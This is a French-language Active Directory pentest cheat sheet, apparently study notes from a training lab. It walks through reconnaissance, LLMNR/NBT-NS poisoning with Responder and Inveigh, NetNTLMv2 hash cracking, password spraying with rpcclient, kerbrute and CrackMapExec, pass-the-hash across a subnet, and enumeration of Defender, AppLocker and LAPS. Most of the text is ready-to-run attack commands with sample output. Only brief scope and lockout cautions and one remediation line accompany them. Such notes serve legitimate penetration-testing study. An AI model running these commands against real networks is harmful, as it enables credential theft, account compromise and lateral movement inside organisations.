
# Active Directory External Recon

## 1. ASN/IP Space Enumeration

`bgp.he.net` :  
Recherche l’ASN et les plages IP associées à un domaine (BGP Toolkit).

`whois <ip ou domaine>` :  
Identifie le propriétaire, ASN et bloc IP d’un domaine ou d’une IP.

`arin.net / ripe.net / apnic.net` :  
Registre pour trouver des infos sur le range IP et la localisation.

## 2. DNS & Domain Enumeration

`dig <domaine>` :  
Collecte les enregistrements DNS (A, MX, NS, TXT, etc).

`host -t any <domaine>` :  
Interroge tous les enregistrements DNS connus pour un domaine.

`viewdns.info` :  
Outil web pour effectuer Reverse IP, Reverse Whois, DNS history, etc.

`nslookup ns1.<domaine>` :  
Résout l’adresse IP du serveur de noms.

`Sublist3r -d <domaine>` :  
Enumère rapidement les sous-domaines d’un domaine cible.


## 3. Public Data & Leaks

`filetype:pdf inurl:<domaine>` :  
Google Dork pour trouver des documents PDF hébergés par la cible.

`intext:"@<domaine>" inurl:<domaine>` :  
Dork pour trouver des adresses email liées à la cible sur son propre site.

`trufflehog <repo github>` :  
Cherche des secrets/fuites dans les dépôts GitHub.

`HaveIBeenPwned / Dehashed` :  
Recherche si des emails de l’entreprise apparaissent dans des leaks/breaches publics.

`github-dorks` :  
Utilise des dorks spécialisés pour trouver des credentials dans du code source public.


## 4. Social Media & Company Data Mining

`linkedin2username -c <company>` :  
Génère des variantes de logins AD à partir de LinkedIn.

`theHarvester -d <domaine> -b linkedin` :  
Récupère emails et noms d’utilisateurs LinkedIn de la cible.

`Recon-ng` :  
Framework complet pour récolter infos sur emails, domaines, profils sociaux, etc.

`Google: site:linkedin.com/company/<nom>` :  
Trouve la page entreprise officielle et des collaborateurs.


## 5. Username & Email Format Harvesting

`Contact page/LinkedIn/Indeed/Job boards` :  
Récupère la convention de nommage des emails et des comptes AD (ex: prenom.nom@, f.lastname, etc).

`theHarvester -d <domaine> -b all` :  
Génère automatiquement une liste d’adresses email valides pour brute-force/password spraying.

`CeWL --email --depth 2 -d <domaine>` :  
Scrape des emails et mots-clés depuis le site cible.

## 6. Data Disclosure & Document Metadata

`exiftool *.pdf` :  
Analyse les métadonnées de fichiers récupérés (souvent auteurs = username AD).

`strings *.pdf | grep http` :  
Trouve des liens vers des intranets, portails internes, ou ressources non listées.

`docx2txt <file.docx>` :  
Extrait du texte et métadonnées cachées dans des fichiers Office.

## 7. Validation et Enrichissement

`Reverse IP lookup (viewdns.info, crt.sh)` :  
Trouve d’autres domaines hébergés sur la même IP.

`PTR/Reverse DNS` :  
Peut révéler le nom interne du serveur ou de la machine (utile pour AD naming).

## 8. Breach & Credential Data

`Dehashed, HaveIBeenPwned, LeakCheck.net` :  
Recherche de leaks d’identifiants (username, emails, mots de passe) réutilisables sur services AD (VPN, OWA, RDS, etc).

`hunter.io` :  
Liste tous les emails publics du domaine et devine la convention de nommage.

## 9. Conseils & Best Practices

- Toujours valider que les IP/domaines découverts sont dans le scope.
- Prendre des notes/sauvegarder tout ce qui est trouvé dès la collecte.
- Préférer la passive reconnaissance avant toute attaque active ou bruteforce.
- Recouper les infos via plusieurs sources (ex: Whois, DNS, BGP, Social, Breach).
- Adapter ses wordlists d’attaque à partir des formats récoltés (username/email).

---

# Initial Internal Domain Enumeration 

## 1. Ecoute & identification passive sur le réseau

`sudo -E wireshark`  
Lance Wireshark pour capturer tout le trafic réseau, repérer ARP, MDNS, NBNS, LLMNR.

`sudo tcpdump -i <interface> -w traffic.pcap`  
Capture le trafic réseau dans un fichier à analyser plus tard.

## 2. Analyse de paquets pour repérage de hosts/domaines

`arp -a`  
Affiche la table ARP et détecte les IP récemment vues (ARP requests).

`strings traffic.pcap | grep -Ei "host|user|domain"`  
Trouve des infos textuelles utiles dans la capture réseau.

## 3. Ecoute LLMNR/NBT-NS/MDNS

`sudo responder -I <interface> -A`  
Ecoute passivement et analyse les requêtes LLMNR/NBT-NS/MDNS pour détecter des hosts et noms de domaine.

## 4. Ping sweep (découverte de hosts actifs)

`fping -asgq 172.16.5.0/23`  
Ping tout le sous-réseau pour identifier les IP actives discrètement.

## 5. Scan actif des hôtes trouvés

`nmap -v -A -iL hosts.txt -oA nmap_enum`  
Scan complet des IP détectées : ports/services, versions, OS, scripts AD/SMB/LDAP/Kerberos.

`nmap -p 88,389,445,636,3268,3269,3389 <target>`  
Scan rapide des ports AD classiques (Kerberos, LDAP, SMB, RDP…).

## 6. Enumération des utilisateurs AD (sans credentials)

`kerbrute userenum -d <DOMAIN.LOCAL> --dc <DC_IP> usernames.txt -o valid_ad_users`  
Enumère les comptes valides via Kerberos Pre-Auth (ultra utile en interne).

## 7. Découverte de services exposés/OS vulnérables

`nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 <target>`  
Enumération avancée des partages, OS et utilisateurs via SMB.

`nmap --script ldap* -p389 <target>`  
Script Nmap pour enumérer le LDAP en mode anonyme (si permis).

## 8. Identifier les DC, serveurs clés et conventions de nommage

`nmap -sS -p88,389,445,636,3268,3269 --script krb5-enum-users --script-args krb5-enum-users.realm=<DOMAIN> <targets>`  
Enumère utilisateurs Kerberos et repère DCs/domain controllers.

## 9. Tri & documentation des résultats

`grep -Ei 'Domain|Host|User|Computer' nmap_enum.nmap > summary.txt`  
Filtre les résultats pour extraire les infos clés à documenter.

## 10. Notes & bonnes pratiques

- Toujours sauvegarder les .pcap, outputs Nmap, userlists trouvées.
- Adapter le bruit des scans au contexte (non-évasif = OK / Red Team = privilégier le passif).
- Prendre note des noms d’hôtes, conventions de nommage et schémas utilisateurs dès les premières étapes.
- Identifier rapidement les systèmes obsolètes (Windows 7/2008) pour quick win (EternalBlue, MS08-067…).

---

# LLMNR/NBT-NS Poisoning – from Linux 

## 1. Concept rapide

> LLMNR/NBT-NS sont des protocoles de résolution utilisés par Windows quand DNS échoue. Ils sont vulnérables aux attaques Man-in-the-Middle (MITM) permettant de capturer des hash NTLM envoyés en broadcast.

## 2. Outils principaux

`Responder`  
Outil Python pour empoisonner LLMNR, NBT-NS, MDNS et capturer des identifiants (hash NTLM).

`Inveigh`  
Outil cross-platform (C#, Powershell) pour spoofing/récolte de credentials via MITM.

`Metasploit`  
Dispose de modules pour les attaques de spoofing LLMNR/NBT-NS/SMB relay.

## 3. Lancer Responder pour écouter & empoisonner

`sudo responder -I <interface>`  
Démarre Responder en mode poison sur l’interface réseau donnée, répond à LLMNR/NBT-NS/MDNS.

`sudo responder -I <interface> -wrf`  
Active aussi WPAD proxy (w), réponses NetBIOS wredir (r), et fingerprint des hôtes (f).

`sudo responder -I <interface> -A`  
Mode passif (analyse uniquement, aucune réponse/empoisonnement).

## 4. Vérifier les ports ouverts nécessaires

- UDP 137/138/53/1434/5355/5353
- TCP 80/135/139/445/21/25/110/1433/3141/587/3128/389/1433

> Certains modules de Responder nécessitent que ces ports soient libres sur la machine d’attaque.

## 5. Résultats & fichiers de log

`/usr/share/responder/logs/`  
Les hash capturés sont sauvegardés ici, séparés par protocole/hôte.

Ex :  
`SMB-NTLMv2-SSP-172.16.5.25.txt`  
`HTTP-NTLMv2-172.16.5.200.txt`

## 6. Cracker les hash NetNTLMv2 avec Hashcat

`hashcat -m 5600 <fichier_hash> <wordlist>`  
Crack des hash NetNTLMv2 capturés avec Responder.

> Ex :  
`hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt`

## 7. Exploit possible : SMB relay (non couvert ici)

> Les hash capturés peuvent aussi parfois être relayés vers d’autres hôtes vulnérables pour une élévation de privilèges (SMB Relay), ou pour une authentification directe si le hash correspond à un compte admin.


## 8. Conseils & bonnes pratiques

- Faire tourner Responder dans un `tmux`/`screen` pour maximiser la récolte de hash.
- Préférer l’utilisation d’un réseau de test/scope autorisé.
- Toujours vérifier que Responder ne bloque pas des ports critiques pour ton propre accès.
- Dès qu’un hash est cracké, tente la connexion sur un service exposé (SMB, RDP…).


## 9. Exemples avancés

`responder -I eth0 -wFv`  
WPAD + force l’authentification NTLM/Basic sur proxy + mode verbeux.

`john --format=netntlmv2 <hashfile> --wordlist=<wordlist>`  
Crack avec John the Ripper si Hashcat indispo.

---

# LLMNR/NBT-NS Poisoning – from Windows

## 1. Thème

> Capturer des hash NTLM (et potentiellement des credentials clairs) sur un réseau Windows via l’empoisonnement LLMNR/NBT-NS avec Inveigh (PowerShell ou C#).

## 2. Outil principal

**Inveigh**  
- PowerShell : Script original, idéal pour usage rapide et custom sur Windows.
- C# (InveighZero) : Version compilée, maintenue, plus rapide et discrète.


## 3. Lancer Inveigh (PowerShell)

`Import-Module .\Inveigh.ps1`  
Charge le module dans PowerShell.

`Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y`  

Démarre Inveigh : écoute LLMNR/NBT-NS, affiche à l’écran et écrit dans un fichier.  
- `-LLMNR Y` : active l’empoisonnement LLMNR  
- `-NBNS Y` : active l’empoisonnement NetBIOS Name Service  
- `-ConsoleOutput Y` : affiche les résultats à l’écran  
- `-FileOutput Y` : écrit les résultats dans un fichier (par défaut `C:\Tools`)

`(Get-Command Invoke-Inveigh).Parameters`  
Liste tous les paramètres possibles.

## 4. Lancer Inveigh (C#)

`.\Inveigh.exe`  
Lance la version compilée, écoute les requêtes LLMNR/NBNS/SMB, affiche les captures.

## 5. Résultats & logs

- Hashes capturés et logs disponibles dans le dossier spécifié (`C:\Tools` par défaut)
- La console affiche en temps réel les requêtes, hash capturés, etc.

## 6. Console interactive (C#) – commandes utiles

Quand Inveigh tourne, appuier sur `ESC` pour ouvrir la console et taper :

- `GET NTLMV2UNIQUE` : Affiche les hash NTLMv2 uniques capturés.
- `GET NTLMV1UNIQUE` : Affiche les hash NTLMv1 uniques.
- `GET CLEARTEXT` : Affiche les credentials clairs capturés (rare mais possible).
- `GET NTLMV2USERNAMES` : Liste les utilisateurs associés aux hash NTLMv2.
- `STOP` : Arrête Inveigh.

## 7. Exemples pratiques

```powershell
# Lancer Inveigh en mode complet depuis PowerShell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### Lancer InveighZero (C#) avec options par défaut
.\Inveigh.exe

## 8. Crack les hash récupérés

`hashcat -m 5600 <hashfile> <wordlist>`
Crack NetNTLMv2 capturés avec Hashcat (identique à la version Linux).

## 9. Conseils & bonnes pratiques

- Lancer PowerShell/Exe en tant qu’admin pour éviter les erreurs de port.
- Surveiller les warnings : ports déjà pris, conflits éventuels.
- Collecte continue : laisser tourner Inveigh pendant que tu fais autre chose.
- Analyser tous les utilisateurs/hash récupérés pour du password spraying ou du lateral movement.
- STOP ou Ctrl+C pour stopper la capture quand tu veux.

---

# AD Password Policy Enumeration

## 1. Avec credentials (Linux)

- CrackMapExec :  
  `crackmapexec smb <dc_ip> -u <user> -p <pass> --pass-pol`

## 2. Sans credentials (NULL Session Linux)

- rpcclient (null session) :  
  `rpcclient -U "" -N <dc_ip>`
  - Dans le prompt rpcclient :  
    - `querydominfo`
    - `getdompwinfo`

- enum4linux :  
  `enum4linux -P <dc_ip>`

- enum4linux-ng (plus lisible, export yaml/json) :  
  `enum4linux-ng -P <dc_ip> -oA output`

## 3. LDAP anonymous bind (Linux)

- ldapsearch :  
  `ldapsearch -h <dc_ip> -x -b "DC=DOM,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

## 4. Avec credentials (Windows)

- net.exe (commande native) :  
  `net accounts`

- PowerView :  
  `Import-Module .\PowerView.ps1`
  `Get-DomainPolicy`

## 5. Null session Windows

- Ouvrir une null session SMB depuis Windows :  
  `net use \\<dc>\ipc$ "" /u:""`

## 6. Conseils

- Toujours vérifier la password policy AVANT tout password spraying
- Si la policy est inconnue, ne jamais dépasser 1 ou 2 tentatives par user (et attendre au moins 1h entre 2 essais)
- Ne jamais lockout de comptes sur un test client

## 8. Outils alternatifs

- ad-ldapdomaindump.py
- windapsearch.py
- SharpView / SharpMapExec (Windows/.NET)
---

# Password Spraying – Target User List

## Objectif

Avant un password spray, il faut :
- Une liste de users valides (AD)
- Connaitre la password policy du domaine
- Logger : users testés, DC utilisé, date/heure, mot de passe tenté


## 1. Récupérer la liste des users AD

### a. Avec SMB NULL session (Linux)

- **enum4linux**
  `enum4linux -U <dc_ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

- **rpcclient**
  `rpcclient -U "" -N <dc_ip>`

- **CrackMapExec**
  `crackmapexec smb <dc_ip> --users`
*Affiche aussi badpwdcount (tentatives ratées), utile pour éviter le lockout*

### b. Avec LDAP anonymous bind (Linux)

- **ldapsearch**
  `ldapsearch -h <dc_ip> -x -b "DC=DOM,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`

- **windapsearch**
  `./windapsearch.py --dc-ip <dc_ip> -u "" -U`
*Affiche tous les users, UPNs, CN, etc.*

### c. Avec Kerbrute (internal network)

- **Kerbrute (userenum)**
  `kerbrute userenum -d <dom> --dc <dc_ip> <wordlist.txt>`
*Renvoie seulement les users valides*

### d. Avec credentials (Linux/Windows)

- **CrackMapExec**
  `crackmapexec smb <dc_ip> -u <user> -p <pass> --users`

### e. Autres méthodes (si pas d'accès interne)

- Générer wordlists via outils open-source (linkedin2username, Github, harvesting email, etc.)
- Utiliser des wordlists génériques (statistically-likely-usernames, etc.)

## 2. Nettoyer la liste de users

- Enlever : comptes built-in (administrator, guest, krbtgt, comptes machine $)
- Supprimer les doublons
- Filtrer selon les patterns observés (first.last, flast, etc.)
- Enlever les comptes proches du lockout (badpwdcount élevé)

## 3. Points de vigilance

- **NE PAS** tenter + de tentatives que la lockout threshold (3 tentatives sûres si lockout=5)
- Espacer les sprays (au moins 31 min si lockout window = 30 min)
- Logguer tout ce qui est tenté
- Si la policy est inconnue : 1 spray max / user et grosse pause

## 4. Exemple de log à tenir

| Date/Heure          | DC          | User          | Password         | Résultat        |
|---------------------|-------------|---------------|------------------|-----------------|
| 2025-07-21 11:15    | 172.16.5.5  | htb-student   | Welcome2024!     | Success         |
| 2025-07-21 11:16    | 172.16.5.5  | avazquez      | Welcome2024!     | Failed          |

## 5. Outils alternatifs / Tips

- **Avec SYSTEM shell sur Windows** : on peut aussi dumper les users via PowerShell (PowerView, SharpView)
- Pour les très gros environnements, filtrer d'abord sur les UPN actifs ou lastLogon récent

---

# Internal Password Spraying - from Linux

## Méthodes principales

### Avec `rpcclient`

On tente un login pour chaque user de la liste.  
Si la réponse contient `Authority`, le login est OK :

`for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

**Exemple de sortie** :
- `Account Name: tjohnson, Authority Name: INLANEFREIGHT`
- `Account Name: sgage, Authority Name: INLANEFREIGHT`

### Avec `kerbrute`

Password spraying avec Kerbrute :

`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`

**Exemple de sortie** :
- `[+] VALID LOGIN:   sgage@inlanefreight.local:Welcome1`

### Avec `CrackMapExec`

Password spraying sur tous les users avec un seul mot de passe :

`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

**Exemple de sortie** :
- `[+] INLANEFREIGHT.LOCAL\avazquez:Password123`

Pour valider un identifiant trouvé sur le DC :

`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`

## Password reuse : Local Admin

Si on récupères le hash NTLM ou le mot de passe du compte administrateur local d’un poste, on peux tenter le même mot de passe sur tous les autres hôtes du réseau.

Exemple : spray du hash admin local partout avec le flag `--local-auth` :

`sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

**Exemple de sortie** :
- `[+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)`

Ce problème est très courant dans les grands parcs où la même image disque (golden image) est utilisée partout.

## Conseils et bonnes pratiques

- Toujours respecter le `lockout threshold` du domaine (ex : 5 tentatives = lock 30min)
- Faire des pauses entre chaque spray (ex : 2 ou 3 passes puis attendre 30-60min)
- Logger : comptes ciblés, password testé, date/heure, DC utilisé, résultat
- Tenter les patterns de reuse : user local/admin peut aussi être réutilisé comme user de domaine, ou entre domaines en trust
- ⚠️ **ATTENTION : méthode très bruyante**, à éviter si besoin de rester stealth (préférer Kerbrute ou attaques plus subtiles)

## Remédiation côté client

- **Installer et configurer LAPS (Local Administrator Password Solution)** pour imposer un mot de passe admin local unique et rotatif sur chaque machine (empêche totalement ce type d’attaque via reuse admin local).

---

# Internal Password Spraying - from Windows

## Principe

Depuis un hôte Windows membre du domaine, il est possible de réaliser du password spraying avec des outils natifs ou spécifiques.  
Le script PowerShell **DomainPasswordSpray** est particulièrement efficace pour cela.

## Utilisation de DomainPasswordSpray.ps1

Si l’hôte est **membre du domaine** et que nous sommes authentifié, le script peut générer automatiquement la liste d’utilisateurs, interroger la politique de mot de passe, et exclure les comptes proches du lockout.

- Pour charger le module :
`Import-Module .\DomainPasswordSpray.ps1`

- Pour lancer un spray d’un seul mot de passe sur tous les utilisateurs du domaine et écrire les succès dans un fichier :
`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

## Avec Kerbrute sur Windows

On peux également utiliser Kerbrute pour faire la même chose que sous Linux :
- user enumeration
- password spraying

## Password Spraying Externe

Cibles typiques :
- Microsoft 0365
- Outlook Web Exchange
- Skype for Business
- Lync Server
- Portails RDS, Citrix, VDI, VPN utilisant l’AD
- Applis web custom connectées à l’AD

---

# Enumerating Security Controls

Après avoir obtenu un accès, il est important d’énumérer les contrôles de sécurité en place, car ils peuvent affecter nos outils et méthodologie d’attaque AD.

## Défenses typiques et comment les détecter

### Windows Defender

Defender (Microsoft Defender) bloque aujourd’hui nativement beaucoup d’outils pentest (ex: PowerView).  
Pour vérifier s’il est actif :
`Get-MpComputerStatus`

**Vérifie la valeur de** `RealTimeProtectionEnabled` **: si True → Defender actif.**

### AppLocker

AppLocker est la solution Microsoft de whitelisting applicatif (autorise ou bloque des programmes/scripts).  
Typiquement, certaines politiques bloquent `powershell.exe` mais oublient d’autres emplacements.  
Pour lister la politique active :
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Regarder les règles **Deny** ou **Allow** et les chemins ciblés.

### PowerShell Constrained Language Mode

Ce mode limite fortement les capacités de PowerShell (pas de COM, types .NET limités, etc).
Pour voir si nous sommes limité :
`$ExecutionContext.SessionState.LanguageMode`

- `ConstrainedLanguage` = mode limité  
- `FullLanguage` = full PowerShell

### LAPS (Local Administrator Password Solution)

LAPS randomise et gère automatiquement les mots de passe admin locaux pour limiter la propagation latérale.  
Avec le LAPSToolkit, on peux voir qui a accès à la lecture des mots de passe.

Lister les groupes délégués à la lecture des passwords LAPS :
`Find-LAPSDelegatedGroups`

Lister les groupes/identités ayant les droits étendus sur LAPS :
`Find-AdmPwdExtendedRights`

Lister les machines avec LAPS et les mots de passe si notre user a le droit :
`Get-LAPSComputers`

## Points à retenir

- Toujours checker les contrôles en place avant d’aller plus loin.
- Adapter les outils et payloads si nécessaire (AppLocker, Defender, etc).
- Les bypass seront à adapter selon la configuration (détection, whitelisting, etc).

---



